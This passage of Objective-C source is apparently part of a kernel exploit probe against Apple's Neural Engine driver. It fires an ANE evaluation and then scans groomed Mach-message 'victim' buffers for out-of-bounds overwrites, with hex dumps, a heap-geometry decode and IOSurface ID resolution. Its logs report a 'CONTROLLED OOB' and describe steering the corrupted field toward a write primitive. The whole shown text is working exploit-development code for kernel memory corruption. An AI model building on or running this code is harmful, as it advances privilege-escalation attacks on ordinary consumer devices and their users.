                            [outputs addObject:[surfCls objectWithIOSurface:s]];
                            [outIdx addObject:@0];
                        }
                        if (!ok) {
                            L(@"[-] surface create failed in MIL route - honest miss.");
                        } else {
                        P099_ANERequest *req = [reqCls requestWithInputs:inputs inputIndices:inIdx
                                                                 outputs:outputs outputIndices:outIdx
                                                          procedureIndex:@0];
                        if (req) {
                            err = nil;
                            ok = [client doEvaluateDirectWithModel:model options:@{} request:req
                                                               qos:2 error:&err];
                            L(@"[*] MIL direct-path evaluate ok=%d err=%@",
                              ok, err ? err.localizedDescription : @"-");
                            evaluated = ok;
                        } else {
                            L(@"[-] requestWithInputs failed - honest miss.");
                        }
                    }
                }
                }
            } else {
                L(@"[-] MIL route unavailable (classes%@ modeldir%@) - P046 CLOSED confirmed.",
                  modelCls ? @"" : @" MISSING", modelFiles ? @"" : @" MISSING");
            }
        }

        if (!evaluated) {
            L(@"[-] no evaluation fired (both routes missed) - honest miss, no OOB, no panic.");
            L(@"=== VERDICT: NO FIRE ===");
            goto finish;
        }

        // ---- scan victims for prewire-record diffs ----
        {
            uint8_t expected[P099_PAYLOAD_SIZE];
            uint8_t actual[P099_PAYLOAD_SIZE];
            int hits = 0;
            int dumped = 0;
            for (uint32_t i = 0; i < P099_PAIR_COUNT && pairs; i++) {
                if (!pairs[i].victim) continue;
                if (g_p099_portkindN && i >= P099_PAIR_COUNT - g_p099_portkindN) {
                    /* v6 door round: the desc readback IS the conversion verdict;
                       door rounds do not consume the payload-diff budget */
                    p099_recv_portkind_door(pairs[i].victim, i);
                    continue;
                }
                kern_return_t rkr = p099_recv_payload(pairs[i].victim, actual);
                if (rkr != MACH_MSG_SUCCESS) continue;
                p099_fill_payload(expected, i, 1);
                if (memcmp(actual, expected, P099_PAYLOAD_SIZE) == 0) continue;
                size_t first = P099_PAYLOAD_SIZE;
                for (size_t j = 0; j < P099_PAYLOAD_SIZE; j++) {
                    if (actual[j] != expected[j]) { first = j; break; }
                }
                hits++;
                L(@"[+] HIT victim=%u first_diff=0x%04zx (record index ~0x%02zx)", i, first, first / 0x10);
                for (size_t off = first & ~(size_t)0xf;
                     off < ((first & ~(size_t)0xf) + 0x40) && off + 16 <= P099_PAYLOAD_SIZE; off += 16) {
                    NSString *hex = @"";
                    for (uint32_t k = 0; k < 16; k++) {
                        hex = [hex stringByAppendingFormat:@"%02x%s", actual[off + k], (k == 15) ? "" : " "];
                    }
                    L(@"[+]   %04zx: %@", off, hex);
                }
                /* v3 geomap: full-payload record decode, first two victims */
                if (dumped < 2) {
                    dumped++;
                    L(@"[geom] victim=%u FULL decode (0xb80 = 184 slots):", i);
                    int recN = 0, recIn = 0, recOut = 0;
                    size_t firstRec = 0, lastRec = 0;
                    for (size_t off = 0; off + 16 <= P099_PAYLOAD_SIZE; off += 16) {
                        if (actual[off + 5] | actual[off + 6] | actual[off + 7]) continue;
                        uint64_t tail; memcpy(&tail, actual + off + 8, 8);
                        if (tail == 0xEEEEEEEEEEEEEEEEULL) continue;
                        uint32_t sid; memcpy(&sid, actual + off, 4);
                        uint8_t fl = actual[off + 4];
                        NSString *kind = nil; int pos = -1;
                        if (outSidCap && sid == outSidCap) { kind = @"OUT"; recOut++; }
                        else {
                            for (uint32_t j = 0; j < P099_INPUT_COUNT; j++)
                                if (sid && inSids[j] == sid) { pos = (int)j; kind = @"in"; recIn++; break; }
                        }
                        if (!kind) kind = @"sid?";
                        if (!recN) firstRec = off;
                        lastRec = off;
                        recN++;
                        L(@"[geom]   +0x%04zx sid=%-10u flags=0x%02x tail=%016llx %@%@",
                          off, sid, fl, (unsigned long long)tail, kind,
                          pos >= 0 ? [NSString stringWithFormat:@" pos=%u", pos] : @"");
                    }
                    L(@"[geom] victim=%u records=%d (in=%d out=%d) span=0x%04zx..0x%04zx",
                      i, recN, recIn, recOut, firstRec, lastRec);
                    /* v4 sid-resolve: IOSurfaceLookup is task-scoped, so LIVE
                       = our own staging surfaces (sid->size completes the
                       sid->position map); null = freed or foreign. */
                    if (dumped == 1 && p099_surf_lookup) {
                        uint32_t uniq[64]; int nUniq = 0;
                        for (size_t off = 0; off + 16 <= P099_PAYLOAD_SIZE && nUniq < 64; off += 16) {
                            if (actual[off + 5] | actual[off + 6] | actual[off + 7]) continue;
                            uint64_t t2; memcpy(&t2, actual + off + 8, 8);
                            if (t2 == 0xEEEEEEEEEEEEEEEEULL) continue;
                            uint32_t s2; memcpy(&s2, actual + off, 4);
                            if (!s2) continue;
                            BOOL seen = NO;
                            for (int k = 0; k < nUniq; k++) if (uniq[k] == s2) { seen = YES; break; }
                            if (!seen) uniq[nUniq++] = s2;
                        }
                        L(@"[geom] sid-resolve (%d unique):", nUniq);
                        for (int k = 0; k < nUniq; k++) {
                            CFTypeRef o = p099_surf_lookup(uniq[k]);
                            if (!o) { L(@"[geom]   sid=%-10u freed/foreign", uniq[k]); continue; }
                            size_t asz = p099_surf_allocsz ? (size_t)p099_surf_allocsz((void *)o) : 0;
                            L(@"[geom]   sid=%-10u LIVE size=%zu", uniq[k], asz);
                            CFRelease(o);
                        }
                    }
                }
            }
            L(@"=== VERDICT ===");
            if (hits) {
                L(@"[+] CONTROLLED OOB CONFIRMED: %d victim payload(s) overwritten by prewire", hits);
                L(@"[+] records (surfaceId/symbolIndex/mapFlags/direction, 0x10/record).");
                L(@"[+] first_diff/0x10 = record index crossing into that chunk.");
                L(@"[+] Beta-1 write lane: shape the adjacent chunk with a known object");
                L(@"[+] and steer the corrupted field. Board stays HOLD until then.");
                L(@"[+] v3: the [geom] block above IS the steering map — paste it back.");
            } else {
                L(@"[-] no victim diffs: OOB missed groom (table landed elsewhere),");
                L(@"[-] ANE rejected the program, or evaluation failed above. Honest miss.");
            }
            L(@"[*] board untouched this probe (detection only).");
            /* v11: the door round speaks for itself */
            L(@"[door] totals: read=%u clean=%u smash=%u oolHits=%u",
              g_p099_dvRead, g_p099_dvClean, g_p099_dvSmash, g_p099_oolHits);
            if (g_p099_dvSmash > 0)
                L(@"[+] DOOR LANDING: the record stream crossed IN-FLIGHT door kmsgs (descriptors above)");
            else if (g_p099_dvRead > 0)
                L(@"[-] door: zero desc crossings — landing element was free/other (MAF attests ~25s) or the program was rejected");
        }

finish:
        if (pairs) free(pairs);
        if (drain) free(drain);
        if (g_p099_fd >= 0) { close(g_p099_fd); g_p099_fd = -1; }
        NSString *out = [g_p099_buf copy];
        g_p099_buf = nil;
        return out;
    }
}

@end